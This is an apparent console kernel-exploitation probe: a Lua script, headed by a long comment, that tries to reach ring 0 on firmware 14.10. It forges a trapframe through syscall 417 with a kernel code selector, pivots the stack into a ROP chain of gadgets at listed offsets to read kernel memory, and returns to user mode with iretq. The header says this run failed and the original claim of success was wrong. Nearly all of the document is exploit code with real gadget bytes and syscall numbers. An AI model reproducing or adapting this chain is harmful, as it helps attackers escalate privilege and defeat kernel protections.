-- CRASH_CLASS: RISKY -- ring-0 entry attempt. A wrong result panics the console.
-- PROBE 1366a  ** RESULT IS VOID -- see 1367d **
--
-- The conclusion first drawn from this run ("the chain ran, SMEP and SMAP are off")
-- was wrong. 1367b set rax/rsi/rdi to a self-referential page just before its own
-- iretq and the dump still showed mc_rax=0x1A1 (the 417 syscall number) and
-- mc_rdi=the frame buffer, i.e. the state captured when 417 was ENTERED. 1367d then
-- installed a frame carrying a 0x10000 landmark RIP plus CS=0x08 and got that same
-- pre-417 context back, with no 0x10000 anywhere: 417 faults inside the kernel for a
-- kernel CS and never installs the frame. No ring-0 instruction has been executed on
-- 14.10. The probe is kept for the dump-format facts, not for its original claim.
--
-- PROBE 1366a: 417 trapframe -> CPL0 -> eboot ROP -> kernel read -> iretq to CPL3
--
-- The primitive (measured): syscall 417 installs a caller-supplied frame into the
-- thread's trapframe verbatim. 1358a proved the frame is accepted with the RFLAGS
-- of the live frame and that CS=0x08 is honoured (the thread stops running user
-- code); 1359a proved RIP is honoured (a patched RIP shows up as the faulting RIP
-- in the loader's own dump). RFLAGS is the only validated field (mask 0xFFDAB22A),
-- and the selectors are outside it.
--
-- Why this reaches CPL0 with a usable stack: a same-privilege iretq pops only
-- RIP/CS/RFLAGS, so after the kernel's return iret RSP still points at the frame's
-- rsp slot and [RSP] is that value -- which we choose. The kernel's own return
-- path already executed `swapgs` before its iretq (the only swapgs..iretq site in
-- the 13.60 dump is base+0x257B33 = `swapgs; add rsp,0xE8; iretq`), so at the CPL0
-- landing GS holds the USER base and KERNEL_GS_BASE holds the kernel base: a plain
-- iretq back to CS=0x43 restores exactly the state the kernel intended, and the
-- next syscall's swapgs is correct too. No swapgs gadget is needed.
--
-- The chain (verified byte-for-byte by 1365a, which dumped +-16 bytes around every
-- site; all of these are real instruction bytes at the entry point, several are
-- mid-instruction but that does not matter since we enter there directly):
--   +0xD77D    5E C3        pop rsi; ret
--   +0x1A5CC4  48 8B 06 C3  mov rax,[rsi]; ret
--   +0xC9DFE   5F C3        pop rdi; ret
--   +0x92C67   48 89 07 C3  mov [rdi],rax; ret
--   +0x9A2     5C C3        pop rsp; ret
--   +0x11F41   48 CF        iretq
--
-- Two kernel qwords are read and stored into this process's own chain buffer:
--   K1 = kernel base + 0         (expect 7F 45 4C 46 if the image starts at base)
--   K2 = kernel base + 0x257B33  (expect 0F 01 F8 48 81 C4 E8 00 00 00 on 13.60)
-- If both land, kernel read/write follows from the same chain; if the console
-- panics, CR4.SMEP survived the hypervisor and every ring-0 landing must be kernel
-- text. Either answer is decisive; this probe is the experiment.
--
-- Helper idiom copied from 1359a, which completed: the frame buffer must be 0x600
-- bytes (421 writes more than 0x200 -- a 0x200 buffer corrupts the heap, which is
-- what made 1365a fault), and memory.read_qword/write_qword want the alloc
-- userdata, not a plain Lua number (`addr + off` on the userdata gives a uint64).
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1365a_chain_gadget_validate_20261109_114725.txt
--   results/phase35_dead_end_reruns/1364a_eboot_gadgets_range_20261109_114214.txt
--   results/phase35_dead_end_reruns/1359a_sys417_frame_ride_20261109_113019.txt
--   results/phase35_dead_end_reruns/1358a_sys417_selectors_20261109_112355.txt
--   docs/dumps_13.60/kernel_text.bin (doreti tail at file 0x257b33)

if _G.__p1366_ran then
    print("[!] RE-ENTRY - the installed frame resumed the old RIP. Stopping.")
    print("=== PROBE 1366a RE-ENTRY ===")
    return
end
_G.__p1366_ran = true

print("=== PROBE 1366a: RING-0 ENTRY ATTEMPT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_wd(addr, val)
    return (pcall(function() memory.write_dword(addr, val) end))
end
local function rdq(addr)
    local ok, v = pcall(function() return memory.read_qword(addr) end)
    if not ok or v == nil then return nil end
    return to_num(v)
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok and v ~= nil then return to_num(v) end
    return nil
end
local function wrq(addr, val)
    pcall(function() memory.write_qword(addr, val) end)
end
local function u64v(v) return uint64(string.format("0x%X", v)) end
-- 64-bit constants: Lua 5.1 numbers are doubles, so build from hi/lo strings.
local function U(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end

local KBASE_HI = 0xFFFFFFFF
local KBASE_LO = 0xC1000000

local sc593 = make_syscall(593)
local sc421 = make_syscall(421)
local sc417 = make_syscall(417)
local sc20 = make_syscall(20)

print(string.format("[0] pid=%d", to_num(sc20(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local EBN = to_num(eb_lo) + to_num(eb_hi) * 4294967296
print(string.format("[0] eboot base=0x%X kernel base=0x%X%08X", EBN, KBASE_HI, KBASE_LO))

-- chain layout (0x600 so nothing overruns)
local S = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(S + off, 0) end
local SA = to_num(S)
local OUT1 = SA + 0x1A0
local OUT2 = SA + 0x1A8
local FP   = SA + 0x100

local G_POPSI  = EBN + 0xD77D
local G_MOVRD  = EBN + 0x1A5CC4
local G_POPRDI = EBN + 0xC9DFE
local G_MOVWR  = EBN + 0x92C67
local G_POPRSP = EBN + 0x9A2
local G_IRET   = EBN + 0x11F41

wrq(S + 0x00, u64v(G_POPSI))
wrq(S + 0x08, U(KBASE_HI, KBASE_LO))
wrq(S + 0x10, u64v(G_MOVRD))
wrq(S + 0x18, u64v(G_POPRDI))
wrq(S + 0x20, u64v(OUT1))
wrq(S + 0x28, u64v(G_MOVWR))

wrq(S + 0x30, u64v(G_POPSI))
wrq(S + 0x38, U(KBASE_HI, KBASE_LO + 0x257B33))
wrq(S + 0x40, u64v(G_MOVRD))
wrq(S + 0x48, u64v(G_POPRDI))
wrq(S + 0x50, u64v(OUT2))
wrq(S + 0x58, u64v(G_MOVWR))

wrq(S + 0x60, u64v(G_POPRSP))
wrq(S + 0x68, u64v(FP))

-- live frame
local F = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(F + off, 0) end
print(string.format("[1] frame=0x%X chain=0x%X", to_num(F), SA))

local ok421, rv421 = pcall(function() return sc421(uint64(F)) end)
print(string.format("[1] 421 ok=%s ret=%s", tostring(ok421), tostring(ok421 and to_num(rv421) or -1)))
if not ok421 then print("=== PROBE 1366a ABORT ===") return end

local orig_rip    = rdq(F + 0xE0)
local orig_cs     = rdq(F + 0xE8)
local orig_rflags = rdq(F + 0xF0)
local orig_rsp    = rdq(F + 0xF8)
local orig_ss     = rdq(F + 0x100)
print(string.format("[1] live RIP=0x%X CS=0x%X RFLAGS=0x%X RSP=0x%X SS=0x%X",
    orig_rip or 0, orig_cs or 0, orig_rflags or 0, orig_rsp or 0, orig_ss or 0))
if (orig_cs or 0) ~= 0x43 then print("=== PROBE 1366a: unexpected CS, ABORT ===") return end

print(string.format("[1] poprsi=0x%X movrd=0x%X poprdi=0x%X movwr=0x%X poprsp=0x%X iret=0x%X",
    G_POPSI, G_MOVRD, G_POPRDI, G_MOVWR, G_POPRSP, G_IRET))
print(string.format("[1] K1=0x%X%08X K2=0x%X%08X", KBASE_HI, KBASE_LO, KBASE_HI, KBASE_LO + 0x257B33))
print("[1] chain = pop rsi;K1;mov rax,[rsi];pop rdi;OUT1;mov [rdi],rax;"
    .. " pop rsi;K2;mov rax,[rsi];pop rdi;OUT2;mov [rdi],rax; pop rsp;FP; iretq->orig")

-- return frame: iretq back to CPL3 at the exact original RIP/RSP
wrq(FP + 0x00, u64v(G_IRET))
wrq(FP + 0x08, u64v(orig_rip))
wrq(FP + 0x10, u64v(0x43))
wrq(FP + 0x18, u64v(orig_rflags))
wrq(FP + 0x20, u64v(orig_rsp))
wrq(FP + 0x28, u64v(0x3B))

-- patch the frame: CS=0x08 (ring0 code, index 1), RIP=pivot, RSP=chain
wrq(F + 0xE0, u64v(G_POPRSP))
wrq(F + 0xE8, u64v(0x08))
wrq(F + 0xF8, u64v(SA))

print("[2] installing frame ...")
local ok417, rv417 = pcall(function() return sc417(u64v(to_num(F))) end)
if ok417 then
    print(string.format("[2] 417 returned %s (no ring-0 entry)", tostring(to_num(rv417))))
else
    print("[2] 417 EXC")
end

print("")
print(string.format("[3] OUT1 (kbase+0)        = 0x%X", rdq(S + 0x1A0) or 0))
print(string.format("[3] OUT2 (kbase+0x257B33) = 0x%X", rdq(S + 0x1A8) or 0))
print("")
print("=== PROBE 1366a COMPLETE ===")
